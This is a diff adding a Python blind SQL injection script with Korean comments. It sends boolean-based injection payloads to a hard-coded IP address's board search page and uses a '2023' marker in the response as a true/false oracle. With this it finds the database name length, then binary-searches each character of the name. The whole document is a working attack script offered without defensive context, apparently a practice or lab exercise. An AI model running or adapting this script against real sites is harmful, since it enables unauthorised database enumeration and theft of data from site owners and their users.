@@ -1,0 +1,51 @@
+##blind sql 스크립트
+import requests
+import string
+
+url = ("http://124.60.4.10:9999/board_list_search.php")
+
+code = string.ascii_letters + string.digits + string.punctuation
+
+def find_length():
+    
+    length = 1
+    
+    while True:
+        query = "search=' and length(database())="+str(length)+"-- "
+        req = requests.get(url, params=query)
+        if "2023" in req.text:
+            return length
+        else:
+            length += 1
+            
+print("데이터베이스 길이는: ", find_length())
+
+def find_name():
+    length = find_length()
+    name = ""
+    for i in range(1,length+1):   #DB 길이 만큼
+        j = 1            
+        k = 127           
+        half = 60
+        
+        while True:
+            query = "search=' and ascii(substring(database(),"+str(i)+",1))="+str(half)+"-- "    #아스키코드 60번일 경우
+            print(query)
+            req = requests.get(url, params=query)
+            if "2023" in req.text:
+                name += chr(half)
+                break
+            else:
+                query = "search=' and ascii(substring(database(),"+str(i)+",1))>"+str(half)+"-- "    #아스키코드 60번이 아닐 경우 
+                print(query)
+                req = requests.get(url, params=query)
+                if "2023" in req.text:          #참일 경우 >> 기준점 60부터
+                    j = half
+                    half = (half + k) // 2
+                else:                           #거짓일 경우 >> ~60까지
+                    k = half
+                    half = (j + half) //2
+    
+    print("데이터베이스 이름은:", name)
+
+find_name()
